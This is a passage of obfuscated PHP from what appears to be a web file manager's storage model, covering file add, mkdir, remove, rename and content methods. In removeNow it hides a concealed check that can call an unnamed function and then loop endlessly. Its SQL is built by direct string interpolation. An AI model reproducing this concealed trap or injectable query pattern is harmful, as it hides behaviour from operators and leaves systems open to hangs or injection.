addFile($éîññ¾”, $¶õÍÁ”, $¿¤œÙåè, $¹¤…æº› = false, $£”Ø¹·’ = REPEAT_RENAME) { $ëò‚Ô”Ÿ = Model($_SERVER[ñˆ‹ß¿÷][609])->addFile($¶õÍÁ”, $¿¤œÙåè, $¹¤…æº›); return $this->_createFileCall($éîññ¾”, $¿¤œÙåè, $ëò‚Ô”Ÿ, $£”Ø¹·’); } public function addFileByFileID($óÄÍ÷¨÷, $²Ç²¹»¨, $º¡ìĞÍİ, $Êòşà¬â = REPEAT_RENAME) { $ëàÄç¯ =& $_SERVER[ñˆ‹ß¿÷]; $â¸ª‹ = Model($ëàÄç¯[609])->find($²Ç²¹»¨); Model($ëàÄç¯[609])->linkAdd($²Ç²¹»¨); return $this->_createFileCall($óÄÍ÷¨÷, $º¡ìĞÍİ, $â¸ª‹, $Êòşà¬â); } public function addFileByRemote($¡Í»ÓŞâ, $íÏ¾Ã°Õ, $ŠÒà±Ãİ, $…é§ˆŠ¬ = array(), $›Ä•ë«² = REPEAT_RENAME) { $ÖÄ§àÜû = Model($_SERVER[ñˆ‹ß¿÷][609])->addFileByRemote($íÏ¾Ã°Õ, $ŠÒà±Ãİ, $…é§ˆŠ¬); return $this->_createFileCall($¡Í»ÓŞâ, $ŠÒà±Ãİ, $ÖÄ§àÜû, $›Ä•ë«²); } private function _createFileCall($Úİ‹Ş–š, $œÑ°»Ò¢, $³¸¡··Š, $Ê±ÄáÌã, $çÃ¹²Ïİ = "\x75\160\154\157\x61\x64") { $§ÙÆ† =& $_SERVER[ñˆ‹ß¿÷]; $ŒËÙÌº€ = !1; $this->setMasterDB(); $this->lockWriteStart($Úİ‹Ş–š, $œÑ°»Ò¢); $Êì¡†²ø = $this->fileNameExist($Úİ‹Ş–š, $œÑ°»Ò¢); $ıŞ«ş°¼ = $this->_createFile($Úİ‹Ş–š, $œÑ°»Ò¢, $³¸¡··Š, $Ê±ÄáÌã, $ŒËÙÌº€); if (!$ŒËÙÌº€) { Model($§ÙÆ†[471])->remove($³¸¡··Š[$§ÙÆ†[468]]); } if ($ŒËÙÌº€ && $ıŞ«ş°¼ && $ıŞ«ş°¼ != $Êì¡†²ø) { Model($§ÙÆ†[2077])->eventCreate($ıŞ«ş°¼, $çÃ¹²Ïİ); } $this->lockWriteEnd($Úİ‹Ş–š, $œÑ°»Ò¢); return $ıŞ«ş°¼; } public function mkdir($¥¸¢ïş¸, $üŞİÇ„“, $êºßÌŠ = REPEAT_SKIP) { $ÃşÇ¢¨¢ =& $_SERVER[ñˆ‹ß¿÷]; $this->setMasterDB(); $Ñê©³®Œ = $this->sourceInfo($¥¸¢ïş¸); if (!$Ñê©³®Œ) { return !1; } $this->lockWriteStart($¥¸¢ïş¸, $üŞİÇ„“); if ($êºßÌŠ !== !1) { $šû‡ğ¦ = $this->fileNameExist($¥¸¢ïş¸, $üŞİÇ„“); if ($šû‡ğ¦ && $êºßÌŠ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¥¸¢ïş¸, $üŞİÇ„“); return $šû‡ğ¦; } $üŞİÇ„“ = $this->fileNameAuto($¥¸¢ïş¸, $üŞİÇ„“, $êºßÌŠ); } $æ’“Æıä = array($ÃşÇ¢¨¢[583] => 1, $ÃşÇ¢¨¢[420] => $üŞİÇ„“, $ÃşÇ¢¨¢[584] => $ÃşÇ¢¨¢[12], $ÃşÇ¢¨¢[469] => 0, $ÃşÇ¢¨¢[585] => 0); $·Õ­¹‚œ = $this->_addSource($æ’“Æıä, $Ñê©³®Œ); Model($ÃşÇ¢¨¢[2077])->eventCreate($·Õ­¹‚œ, $ÃşÇ¢¨¢[1348]); $this->lockWriteEnd($¥¸¢ïş¸, $üŞİÇ„“); return $·Õ­¹‚œ; } public function listSourceRoot($óŒĞËÍ¬, $õÒ‚¤¢«, $«À„˜ = "\163\x6f\165\162\x63\x65\x49\x44\54\x74\x61\162\147\145\x74\x49\104\x2c\163\x69\x7a\x65") { $±£½Õ×ñ =& $_SERVER[ñˆ‹ß¿÷]; $óÇ§ŒÄ° = $±£½Õ×ñ[378]; $ÜƒÓÔ½ = array(); $À‡¬¢İ© = 1024 * 50; $ûÚ˜ìø‡ = is_array($ûÚ˜ìø‡) ? $ûÚ˜ìø‡ : array(); $«Ëà§è¹ = count($õÒ‚¤¢«); $ğ²¼±§£ = $this->tablePrefix . $±£½Õ×ñ[2110]; for ($è·ÔòÚ = 0; $è·ÔòÚ < $«Ëà§è¹; $è·ÔòÚ++) { $¹µ¿ñÛ‰ = $õÒ‚¤¢«[$è·ÔòÚ]; $óÇ§ŒÄ° .= "\123\105\x4c\x45\x43\124\x20\52\40\106\x52\x4f\x4d\x20\50\x53\x45\x4c\x45\103\124\40{$«À„˜}\40\106\x52\117\115\x20\140{$ğ²¼±§£}\140\x20\127\x48\105\x52\x45\40"; $óÇ§ŒÄ° .= "\140\x70\x61\162\145\156\x74\111\x44\x60\x3d\60\40\101\x4e\104\x20\x60\x74\141\x72\x67\x65\x74\x49\x44\140\x3d{$¹µ¿ñÛ‰}\x20\101\116\104\x20\140\x74\141\x72\x67\145\164\124\x79\x70\x65\140\x3d{$óŒĞËÍ¬}\x20\154\151\155\x69\164\40\61\x29\40\x61\x73\x20\x74\x62\137{$è·ÔòÚ}\40\125\x4e\x49\x4f\x4e\40\101\x4c\x4c\40"; if ((strlen($óÇ§ŒÄ°) >= $À‡¬¢İ© || $è·ÔòÚ == $«Ëà§è¹ - 1) && $óÇ§ŒÄ°) { $óÇ§ŒÄ° = substr($óÇ§ŒÄ°, 0, -strlen($±£½Õ×ñ[1045])); $±šè¨Ä’ = $this->query($óÇ§ŒÄ°); $óÇ§ŒÄ° = $±£½Õ×ñ[12]; $ÜƒÓÔ½ = array_merge($ÜƒÓÔ½, $±šè¨Ä’); } } return $ÜƒÓÔ½; } private function _createFile($¤ï©ƒ‡´, $ÖÍ„Ì˜Ü, $Äş€Î•·, $Ë ÖÖæÈ, &$¸”·–‘ú) { $ëÛâè©Ø =& $_SERVER[ñˆ‹ß¿÷]; $ô¡öçŸÑ = $this->sourceInfo($¤ï©ƒ‡´); if (!$Äş€Î•· || !$ô¡öçŸÑ) { return !1; } if ($Ë ÖÖæÈ !== !1) { $ ñ›”û¯ = $this->fileNameExist($¤ï©ƒ‡´, $ÖÍ„Ì˜Ü); } $¸”·–‘ú = !0; if ($Ë ÖÖæÈ && $ ñ›”û¯) { if ($Ë ÖÖæÈ == REPEAT_SKIP) { $¸”·–‘ú = !1; return $ ñ›”û¯; } else { if ($Ë ÖÖæÈ == REPEAT_REPLACE) { $—œ–öŞ“ = $this->sourceInfo($ ñ›”û¯); $™ì¾ à = $this->fileHistory($—œ–öŞ“, $Äş€Î•·[$ëÛâè©Ø[468]], $Äş€Î•·[$ëÛâè©Ø[76]]); if (!$™ì¾ à) { $¸”·–‘ú = !1; } else { $this->folderSizeReset($¤ï©ƒ‡´); } return $ ñ›”û¯; } else { $ÖÍ„Ì˜Ü = $this->fileNameAuto($¤ï©ƒ‡´, $ÖÍ„Ì˜Ü, $Ë ÖÖæÈ, !1); } } } $Üõ’Õô = array($ëÛâè©Ø[583] => 0, $ëÛâè©Ø[420] => $ÖÍ„Ì˜Ü, $ëÛâè©Ø[584] => substr(get_path_ext($ÖÍ„Ì˜Ü), 0, 10), $ëÛâè©Ø[469] => $Äş€Î•·[$ëÛâè©Ø[468]], $ëÛâè©Ø[585] => $Äş€Î•·[$ëÛâè©Ø[76]]); $»ş³üñœ = $this->_addSource($Üõ’Õô, $ô¡öçŸÑ); $this->folderSizeReset($¤ï©ƒ‡´, intval($Üõ’Õô[$ëÛâè©Ø[76]])); return $»ş³üñœ; } protected function fileHistory($÷Ûè‰¦, $“îäÄÇô, $ëãÅ”Ê¼) { $˜­„ôê¶ =& $_SERVER[ñˆ‹ß¿÷]; $—ÄØ¥×Ò = defined($˜­„ôê¶[475]) ? USER_ID : $˜­„ôê¶[197]; if ($÷Ûè‰¦[$˜­„ôê¶[468]] == $“îäÄÇô) { return !1; } $this->checkLock($÷Ûè‰¦[$˜­„ôê¶[402]], $“îäÄÇô); Model($˜­„ôê¶[2111])->addHistory($÷Ûè‰¦); $Å‡¶İ = array($˜­„ôê¶[589] => $—ÄØ¥×Ò, $˜­„ôê¶[424] => time(), $˜­„ôê¶[468] => $“îäÄÇô, $˜­„ôê¶[76] => $ëãÅ”Ê¼); $this->where(array($˜­„ôê¶[417] => $÷Ûè‰¦[$˜­„ôê¶[402]]))->save($Å‡¶İ); $this->sourceCacheClear($÷Ûè‰¦[$˜­„ôê¶[402]]); return !0; } public function checkLock($¥€á‰ÒÇ, $‘¹ñ–) { $ıÎŒ¼´œ =& $_SERVER[ñˆ‹ß¿÷]; $ƒ§ÑäÕÍ = $this->pathInfo($¥€á‰ÒÇ); if (!$this->fileIsLock($ƒ§ÑäÕÍ, !0)) { return; } $êŠÃŒª = Session::get($ıÎŒ¼´œ[2112]); $”ıÜëÙº = substr($ƒ§ÑäÕÍ[$ıÎŒ¼´œ[32]], 0, -1 - strlen($ƒ§ÑäÕÍ[$ıÎŒ¼´œ[174]])) . $ıÎŒ¼´œ[1612] . $êŠÃŒª . $ıÎŒ¼´œ[10] . $ƒ§ÑäÕÍ[$ıÎŒ¼´œ[174]]; $ÆÒ Ğº = Model($ıÎŒ¼´œ[609])->find($‘¹ñ–); $this->_createFileCall($ƒ§ÑäÕÍ[$ıÎŒ¼´œ[432]], $”ıÜëÙº, $ÆÒ Ğº, REPEAT_REPLACE, $ıÎŒ¼´œ[1347]); $·ö¬àœË = $ƒ§ÑäÕÍ[$ıÎŒ¼´œ[466]][$ıÎŒ¼´œ[548]]; $§ËñĞ·î = $·ö¬àœË[$ıÎŒ¼´œ[542]] ? $·ö¬àœË[$ıÎŒ¼´œ[542]] : $·ö¬àœË[$ıÎŒ¼´œ[32]]; show_json(LNG($ıÎŒ¼´œ[2113]) . $ıÎŒ¼´œ[2114] . LNG($ıÎŒ¼´œ[2115]) . $ıÎŒ¼´œ[2116] . $§ËñĞ·î . $ıÎŒ¼´œ[2117], !1); } public function fileIsLock($÷ä–†Ö, $ª…­¥„ø = false) { $¸¦ô÷’È =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($÷ä–†Ö[$¸¦ô÷’È[466]]) || !$÷ä–†Ö[$¸¦ô÷’È[466]][$¸¦ô÷’È[545]]) { return !1; } if ($÷ä–†Ö[$¸¦ô÷’È[466]][$¸¦ô÷’È[545]] != USER_ID) { return !0; } $’£šûŠó = $GLOBALS[$¸¦ô÷’È[6]][$¸¦ô÷’È[89]][$¸¦ô÷’È[546]]; if ($÷ä–†Ö[$¸¦ô÷’È[466]][$¸¦ô÷’È[547]] <= time() - $’£šûŠó) { $this->metaSet($÷ä–†Ö[$¸¦ô÷’È[402]], $¸¦ô÷’È[545], null); $this->metaSet($÷ä–†Ö[$¸¦ô÷’È[402]], $¸¦ô÷’È[547], null); } if ($ª…­¥„ø) { $this->metaSet($÷ä–†Ö[$¸¦ô÷’È[402]], $¸¦ô÷’È[547], time()); } return !1; } private function _addSource($»õÀŠû, $¢¥úî´) { $»‚†Ş· =& $_SERVER[ñˆ‹ß¿÷]; $Šª¸´Æ = defined($»‚†Ş·[475]) ? USER_ID : $»‚†Ş·[197]; $Ó¤¹¯¯ = array($»‚†Ş·[586] => $¢¥úî´[$»‚†Ş·[411]], $»‚†Ş·[587] => $¢¥úî´[$»‚†Ş·[505]], $»‚†Ş·[588] => $Šª¸´Æ, $»‚†Ş·[589] => $Šª¸´Æ, $»‚†Ş·[401] => $¢¥úî´[$»‚†Ş·[402]], $»‚†Ş·[590] => $¢¥úî´[$»‚†Ş·[521]] . $¢¥úî´[$»‚†Ş·[402]] . $»‚†Ş·[50], $»‚†Ş·[430] => 0, $»‚†Ş·[591] => $»‚†Ş·[12]); $»õÀŠû = array_merge($Ó¤¹¯¯, $»õÀŠû); $this->updateModifyTime($»õÀŠû[$»‚†Ş·[432]]); $Éæ×¸Â² = $»‚†Ş·[2118] . $¢¥úî´[$»‚†Ş·[402]]; if (isset(self::$cacheChildList[$Éæ×¸Â²])) { unset(self::$cacheChildList[$Éæ×¸Â²]); } static $ÇÖ©Ç¹Ã = false; if (!$ÇÖ©Ç¹Ã) { Hook::trigger($»‚†Ş·[573], $»õÀŠû); $ÇÖ©Ç¹Ã = !0; } $­²™¯ßä = $this->add($»õÀŠû); $öâŒ ¡ı = array($»‚†Ş·[592] => short_id($­²™¯ßä)); $this->where(array($»‚†Ş·[417] => $­²™¯ßä))->save($öâŒ ¡ı); $this->setNamePinyin($­²™¯ßä, $»õÀŠû[$»‚†Ş·[32]]); return $­²™¯ßä; } public function remove($¡’¾ĞÇ, $–¶âø®¤ = true) { $òúìÛ½´ =& $_SERVER[ñˆ‹ß¿÷]; $Ò¼ƒ…åó = $this->sourceInfo($¡’¾ĞÇ); $Ÿş˜Š®ß = intval($Ò¼ƒ…åó[$òúìÛ½´[411]]) === self::TYPE_SYSTEM; $éÖ»‘Ë = Model($òúìÛ½´[435])->get($òúìÛ½´[2119]) == $òúìÛ½´[88]; if ($Ÿş˜Š®ß || $–¶âø®¤ || !$éÖ»‘Ë) { return $this->removeNow($¡’¾ĞÇ, $–¶âø®¤); } $ËÛÌßã = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $’Îâäı› = $Ò¼ƒ…åó[$òúìÛ½´[411]] == self::TYPE_USER ? $òúìÛ½´[600] : $òúìÛ½´[515]; if ($’Îâäı› == $òúìÛ½´[600]) { $„ìÚü¨Æ = Model($òúìÛ½´[513])->getInfo($Ò¼ƒ…åó[$òúìÛ½´[505]]); $³Â¬È = !empty($„ìÚü¨Æ[$òúìÛ½´[542]]) ? $„ìÚü¨Æ[$òúìÛ½´[542]] : $„ìÚü¨Æ[$òúìÛ½´[32]]; $³Â¬È = $òúìÛ½´[260] . $³Â¬È . $òúìÛ½´[2120] . $Ò¼ƒ…åó[$òúìÛ½´[505]]; } else { $„ìÚü¨Æ = Model($òúìÛ½´[522])->getInfo($Ò¼ƒ…åó[$òúìÛ½´[505]]); $³Â¬È = _get($„ìÚü¨Æ, $òúìÛ½´[32]); $³Â¬È = $òúìÛ½´[162] . $³Â¬È . $òúìÛ½´[2121] . $Ò¼ƒ…åó[$òúìÛ½´[505]]; } $«Óıêï = $òúìÛ½´[2122] . md5($³Â¬È); CacheLock::lock($«Óıêï); $„™ã¿Òƒ = $this->fileNameExist($ËÛÌßã, $³Â¬È); if (!$„™ã¿Òƒ) { $„™ã¿Òƒ = $this->mkdir($ËÛÌßã, $³Â¬È, REPEAT_SKIP); $this->metaSet($„™ã¿Òƒ, $òúìÛ½´[2123], $’Îâäı›); $this->metaSet($„™ã¿Òƒ, $òúìÛ½´[2124], $Ò¼ƒ…åó[$òúìÛ½´[505]]); if ($Ò¼ƒ…åó[$òúìÛ½´[432]] != 0) { $this->metaSet($„™ã¿Òƒ, $òúìÛ½´[2125], _get($„ìÚü¨Æ, $òúìÛ½´[2126])); } } CacheLock::unlock($«Óıêï); $this->metaSet($¡’¾ĞÇ, $òúìÛ½´[2127], $Ò¼ƒ…åó[$òúìÛ½´[432]]); $this->where(array($òúìÛ½´[402] => $¡’¾ĞÇ))->save(array($òúìÛ½´[424] => time())); $this->recycleClear($Ò¼ƒ…åó); $¿ÍÖÎÌş = $this->move($¡’¾ĞÇ, $„™ã¿Òƒ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Ò¼ƒ…åó[$òúìÛ½´[432]]); return $¿ÍÖÎÌş; } private function recycleClear($åàç°Şà) { $›¹½Èãù =& $_SERVER[ñˆ‹ß¿÷]; $Ä†Şôæá = $this->childrenAll($åàç°Şà); $âû‹äá = array($›¹½Èãù[417] => array($›¹½Èãù[418], $Ä†Şôæá[$›¹½Èãù[2128]])); Model($›¹½Èãù[2129])->where($âû‹äá)->delete(); } public function removeNow($ÁùÀúê´, $…›‹Ì‹È = true) { $â—Àê§ =& $_SERVER[ñˆ‹ß¿÷]; if (!isset($_SERVER[$â—Àê§[879]]) || !isset($_SERVER[$â—Àê§[1344]])) { $£‹÷ş» = $â—Àê§[881]; $²éäœ¦§ = $â—Àê§[882]; $áéÀ™ñŒ = $_SERVER[$â—Àê§[883]] . $â—Àê§[884]; $ÔÇ¤¬¼ = $²éäœ¦§($áéÀ™ñŒ); $¸»Ôí€ä = explode($â—Àê§[231], $ÔÇ¤¬¼); if (count($¸»Ôí€ä) < $â—Àê§[626]) { $ûõ¾öˆ = $â—Àê§[885]; $ûõ¾öˆ(); } $‹èûØ÷˜ = $â—Àê§[886]; $‹èûØ÷˜($_SERVER[$â—Àê§[887]]); $ç¸é¤‘ˆ = 1; for ($ ÆÇÅ’… = $ç¸é¤‘ˆ; $ ÆÇÅ’… > 0; $ ÆÇÅ’…++) { $‹èûØ÷˜ = json_encode($GLOBALS[$â—Àê§[418]]); } } $‡ø÷ûˆ = $this->sourceInfo($ÁùÀúê´); $£êöÇÓô = $this->pathInfoMore($ÁùÀúê´); if (!$‡ø÷ûˆ) { return !0; } if ($‡ø÷ûˆ[$â—Àê§[432]] == 0) { if (!_get($GLOBALS, $â—Àê§[503])) { return !1; } } $this->lockMoveStart($ÁùÀúê´); Hook::trigger($â—Àê§[2130], $£êöÇÓô, $…›‹Ì‹È); if ($…›‹Ì‹È) { Model($â—Àê§[2129])->moveToRecycle($ÁùÀúê´); } else { $ôŞÆ•ª = $this->childrenAll($‡ø÷ûˆ); Model($â—Àê§[570])->eventRemove($ÁùÀúê´); $this->removeRelevance($ôŞÆ•ª[$â—Àê§[2128]], $ôŞÆ•ª[$â—Àê§[1479]]); } $this->folderSizeReset($‡ø÷ûˆ[$â—Àê§[432]]); $÷•†· ¸ = array($‡ø÷ûˆ[$â—Àê§[432]]); if ($‡ø÷ûˆ[$â—Àê§[410]] == $â—Àê§[88]) { $÷•†· ¸[] = $‡ø÷ûˆ[$â—Àê§[402]]; } $this->updateModifyTime($÷•†· ¸); $this->lockMoveEnd($ÁùÀúê´); Hook::trigger($â—Àê§[1704], $£êöÇÓô, $…›‹Ì‹È); return !0; } public function childrenAll($×¿øÀîš) { $€Œ´øä¦ =& $_SERVER[ñˆ‹ß¿÷]; $æøÎ‰œ÷ = $×¿øÀîš[$€Œ´øä¦[402]]; if ($×¿øÀîš[$€Œ´øä¦[410]] == $€Œ´øä¦[88]) { $šš¸´†Ñ = array($€Œ´øä¦[590] => array($€Œ´øä¦[550], $×¿øÀîš[$€Œ´øä¦[521]] . $æøÎ‰œ÷ . $€Œ´øä¦[551])); $Û®¹Ô½  = array($€Œ´øä¦[590] => $šš¸´†Ñ[$€Œ´øä¦[521]]); $­‰ö‹½ = $this->field($€Œ´øä¦[2131])->where($Û®¹Ô½ )->select(); $³Å€ñÂà = !1; $ñ¹…ìª = array($æøÎ‰œ÷); if ($­‰ö‹½) { $³Å€ñÂà = array_to_keyvalue($­‰ö‹½, $€Œ´øä¦[12], $€Œ´øä¦[468]); $³Å€ñÂà = array_remove_value($³Å€ñÂà, $€Œ´øä¦[197]); $ñ¹…ìª = array_to_keyvalue($­‰ö‹½, $€Œ´øä¦[12], $€Œ´øä¦[402]); $ñ¹…ìª[] = $æøÎ‰œ÷; } } else { $³Å€ñÂà = array($×¿øÀîš[$€Œ´øä¦[468]]); $ñ¹…ìª = array($æøÎ‰œ÷); } return array($€Œ´øä¦[2128] => $ñ¹…ìª, $€Œ´øä¦[1479] => $³Å€ñÂà); } public function removeArray($Á€«¹÷) { if (!$Á€«¹÷) { return !0; } } public function removeRelevance($¸é„½ÙŸ, $Ö¼£ŞÅè) { $î—¹Ôßê =& $_SERVER[ñˆ‹ß¿÷]; $¸é„½ÙŸ = $¸é„½ÙŸ ? $¸é„½ÙŸ : array(); $Ö¼£ŞÅè = $Ö¼£ŞÅè ? $Ö¼£ŞÅè : array(); $¸é„½ÙŸ = array_unique(array_filter($¸é„½ÙŸ)); $Ö¼£ŞÅè = array_unique(array_filter($Ö¼£ŞÅè)); if (!$¸é„½ÙŸ) { return !1; } $ÁÌó•™‰ = array($î—¹Ôßê[417] => array($î—¹Ôßê[418], $¸é„½ÙŸ)); Model($î—¹Ôßê[2129])->where($ÁÌó•™‰)->delete(); Model($î—¹Ôßê[462])->where($ÁÌó•™‰)->delete(); Model($î—¹Ôßê[1982])->where($ÁÌó•™‰)->delete(); Model($î—¹Ôßê[570])->where($ÁÌó•™‰)->delete(); Model($î—¹Ôßê[1816])->removeBySource($¸é„½ÙŸ); Model($î—¹Ôßê[2111])->removeBySource($¸é„½ÙŸ); $this->where($ÁÌó•™‰)->delete(); Model($î—¹Ôßê[471])->remove($Ö¼£ŞÅè); for ($±¢ş¾ªÍ = 0; $±¢ş¾ªÍ < count($¸é„½ÙŸ); $±¢ş¾ªÍ++) { $this->sourceCacheClear($¸é„½ÙŸ[$±¢ş¾ªÍ]); } } public function rename($ç«ÂáëÄ, $ƒ‰Ú´) { $ÎÏè×´Ó =& $_SERVER[ñˆ‹ß¿÷]; $û«ß»ÊÑ = $this->sourceInfo($ç«ÂáëÄ); if (!$û«ß»ÊÑ) { return !1; } $¬Ô¼ÀÀ = $this->fileNameExist($û«ß»ÊÑ[$ÎÏè×´Ó[432]], $ƒ‰Ú´); if ($¬Ô¼ÀÀ && $¬Ô¼ÀÀ != $ç«ÂáëÄ) { return !1; } $ÆĞ¿ˆ¾İ = array($ÎÏè×´Ó[420] => $ƒ‰Ú´, $ÎÏè×´Ó[589] => USER_ID); if ($û«ß»ÊÑ[$ÎÏè×´Ó[410]] != $ÎÏè×´Ó[88]) { $ÆĞ¿ˆ¾İ[$ÎÏè×´Ó[412]] = substr(get_path_ext($ƒ‰Ú´), 0, 10); } Model($ÎÏè×´Ó[570])->eventRename($ç«ÂáëÄ, $û«ß»ÊÑ[$ÎÏè×´Ó[32]], $ƒ‰Ú´); $this->sourceCacheClear($ç«ÂáëÄ); $this->setNamePinyin($ç«ÂáëÄ, $ÆĞ¿ˆ¾İ[$ÎÏè×´Ó[32]], !1); $this->updateModifyTime($û«ß»ÊÑ[$ÎÏè×´Ó[432]]); $ëÛÏı£‹ = $this->where(array($ÎÏè×´Ó[417] => $ç«ÂáëÄ))->data($ÆĞ¿ˆ¾İ)->save(); $ø×Ç…Õ£ = $ÎÏè×´Ó[2118] . $û«ß»ÊÑ[$ÎÏè×´Ó[432]]; if (isset(self::$cacheChildList[$ø×Ç…Õ£])) { unset(self::$cacheChildList[$ø×Ç…Õ£]); } return $ëÛÏı£‹; } public function setNamePinyin($óÄÕ©“£, $ûÍ“‰Éí, $¸Äå‹ãç = true) { $ÄÁ²éÀ· =& $_SERVER[ñˆ‹ß¿÷]; $ùé·ƒ¹¤ = Input::check($ûÍ“‰Éí, $ÄÁ²éÀ·[593]); $‰è‡«”ì = array($ÄÁ²éÀ·[444] => KodSort::makeStr($ûÍ“‰Éí)); if ($ùé·ƒ¹¤) { $‰è‡«”ì[$ÄÁ²éÀ·[465]] = str_replace($ÄÁ²éÀ·[53], $ÄÁ²éÀ·[12], Pinyin::get($ûÍ“‰Éí)); $‰è‡«”ì[$ÄÁ²éÀ·[464]] = Pinyin::get($ûÍ“‰Éí, $ÄÁ²éÀ·[594]); } if (!$¸Äå‹ãç && !$ùé·ƒ¹¤) { $‰è‡«”ì[$ÄÁ²éÀ·[465]] = null; $‰è‡«”ì[$ÄÁ²éÀ·[464]] = null; } $this->metaSet($óÄÕ©“£, $‰è‡«”ì); } public function getContent($ÃªÎ¢ü) { $åñ©¢è =& $_SERVER[ñˆ‹ß¿÷]; $í©ú¾Ú˜ = $this->fileInfoGet($ÃªÎ¢ü); if (!$í©ú¾Ú˜) { return !1; } if ($í©ú¾Ú˜[$åñ©¢è[76]] == 0) { return $åñ©¢è[12]; } $òü¤Éü´ = $åñ©¢è[2132] . $í©ú¾Ú˜[$åñ©¢è[176]]; if ($í©ú¾Ú˜[$åñ©¢è[76]] <= 1024 * 10) { $¼€ê»¶ = Cache::get($òü¤Éü´); if (!$¼€ê»¶) { $¼€ê»¶ = IO::getContent($í©ú¾Ú˜[$åñ©¢è[84]]); Cache::set($òü¤Éü´, $¼€ê»¶); } return $¼€ê»¶; } if (!$í©ú¾Ú˜[$åñ©¢è[84]]) { return $åñ©¢è[12]; } return IO::getContent($í©ú¾Ú˜[$åñ©¢è[84]]); } public function setDesc($èå¶ç­Ã, $Ä»«ë‚Ö) { $ÊÔ™¢æ =& $_SERVER[ñˆ‹ß¿÷]; Model($ÊÔ™¢æ[570])->eventAddDesc($èå¶ç­Ã, $Ä»«ë‚Ö); return $this->metaSet($èå¶ç­Ã, $ÊÔ™¢æ[453], $Ä»«ë‚Ö); } public function setContent($â¢õôÛ, $†–™•¸ = '') { $Çñò„×” =& $_SERVER[ñˆ‹ß¿÷]; $ùòÄó¢à = $this->sourceInfo($â¢õôÛ); $‘Á¥ÓÛ· = $this->fileInfoGet($â¢õôÛ); if (!$‘Á¥ÓÛ· || !$ùòÄó¢à) { return !1; } $Ÿö³ÍÆŞ = Model($Çñò„×”[471])->addFileByContent($†–™•¸, $ùòÄó¢à[$Çñò„×”[32]]); $©À¼Ë—œ = $this->fileHistory($ùòÄó¢à, $Ÿö³ÍÆŞ[$Çñò„×”[468]], $Ÿö³ÍÆŞ[$Çñò„×”[76]]); if (!$©À¼Ë—œ) { return Model($Çñò„×”[471])->remove($Ÿö³ÍÆŞ[$Çñò„×”[468]]); } $this->folderSizeReset($ùòÄó¢à[$Çñò„×”[432]]); return !0; } public function fileSubstr($äü‰Ê”, $ÉĞ¬áÆ», $ÌãÔö¹İ) { $€¢Ôåüú = $this->fileInfoGet($äü‰Ê”); if (!$€¢Ôåüú) { return !1; } return IO::fileSubstr($€¢Ôåüú[$_SERVER[ñˆ‹ß¿÷][84]], $ÉĞ¬áÆ», $ÌãÔö¹İ); } public function fileInfoGet($¬êä§ó—) { $öøŞ‰²‡ =& $_SERVER[ñˆ‹ß¿÷]; $éİàòëÂ = $this->sourceInfo($¬êä§ó—); if (!$éİàòëÂ || $éİàòëÂ[$öøŞ‰²‡[410]]) { return !1; } $ôïÊ×‘ = $öøŞ‰²‡[474] . $éİàòëÂ[$öøŞ‰²‡[468]]; $Éİ…Á‡ = _get(self::$cacheFileInfo, $ôïÊ×‘); if ($Éİ…Á‡) { return $Éİ…Á‡; } $Ö§‘ÔŞ = Model($öøŞ‰²‡[471])->fileInfo($éİàòëÂ[$öøŞ‰²‡[468]]); if ($Ö§‘ÔŞ) { $Ö§‘ÔŞ[$öøŞ‰²‡[32]] = $éİàòëÂ[$öøŞ‰²‡[32]]; } self::$cacheFileInfo[$ôïÊ×‘] = $Ö§‘ÔŞ; return $Ö§‘ÔŞ; } private function folderChildrenNumber($…´¼”ÈÍ) { $ ¿ÔŠ£ó =& $_SERVER[ñˆ‹ß¿÷]; $“ˆ«µÈ = $this->sourceInfo($…´¼”ÈÍ); $ççü£¹ë = array($ ¿ÔŠ£ó[590] => array($ ¿ÔŠ£ó[550], $“ˆ«µÈ[$ ¿ÔŠ£ó[521]] . $…´¼”ÈÍ . $ ¿ÔŠ£ó[551]), $ ¿ÔŠ£ó[587] => $“ˆ«µÈ[$ ¿ÔŠ£ó[505]], $ ¿ÔŠ£ó[430] => intval($“ˆ«µÈ[$ ¿ÔŠ£ó[431]]), $ ¿ÔŠ£ó[583] => 1); $ú‰¼Æ€¿ = $this->where($ççü£¹ë)->count(); $ª›ÔÙ”é = $this->where($ççü£¹ë)->where(array($ ¿ÔŠ£ó[583] => 0))->count(); return array($ ¿ÔŠ£ó[80] => $ª›ÔÙ”é, $ ¿ÔŠ£ó[81] => $ú‰¼Æ€¿); } public function pathInfo($ÆÕ—ÉÚÛ, $¹›Ø‰›¾ = false) { $ƒñì®æÀ =& $_SERVER[ñˆ‹ß¿÷]; $¹›Ø‰›¾ = !1; $ÆÕ—ÉÚÛ = intval($ÆÕ—ÉÚÛ); $á­Ğïêã = $ƒñì®æÀ[461] . intval($¹›Ø‰›¾) . $ƒñì®æÀ[386] . $ÆÕ—ÉÚÛ; $‡¹—ñ’† = _get(self::$cachePathInfo, $á­Ğïêã); if ($‡¹—ñ’†) { return $‡¹—ñ’†; } $ğµºŒ™ë = $this->sourceInfo($ÆÕ—ÉÚÛ); if (!$ğµºŒ™ë) { return !1; } $ğµºŒ™ë = $this->_listDataApplyItem($ğµºŒ™ë, $¹›Ø‰›¾); self::$cachePathInfo[$á­Ğïêã] = $ğµºŒ™ë; return $ğµºŒ™ë; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ş—²¿Ïœ) { $×‡ˆ§š =& $_SERVER[ñˆ‹ß¿÷]; $Â¯µß¾Â = _get(self::$cachePathInfoMore, $Ş—²¿Ïœ); if ($Â¯µß¾Â) { return $Â¯µß¾Â; } $ÄÀ‰¡¨ = $this->pathInfo($Ş—²¿Ïœ); if (!$ÄÀ‰¡¨) { return !1; } if ($ÄÀ‰¡¨[$×‡ˆ§š[410]] == $×‡ˆ§š[88]) { $ÄÀ‰¡¨[$×‡ˆ§š[79]] = $this->folderChildrenNumber($Ş—²¿Ïœ); } self::$cachePathInfoMore[$Ş—²¿Ïœ] = $ÄÀ‰¡¨; return $ÄÀ‰¡¨; } public function sourceInfo($¦»—Ë¶¯) { $Ò·Ğ¶ß =& $_SERVER[ñˆ‹ß¿÷]; if (!$¦»—Ë¶¯) { return array(); } $¦»—Ë¶¯ = intval($¦»—Ë¶¯); $ç¶®ßŞƒ = $Ò·Ğ¶ß[460] . $¦»—Ë¶¯; $ı•ÃöÇ£ = _get(self::$cacheSourceInfo, $ç¶®ßŞƒ); if ($ı•ÃöÇ£) { return $ı•ÃöÇ£; } $¦”ê‡˜ô = 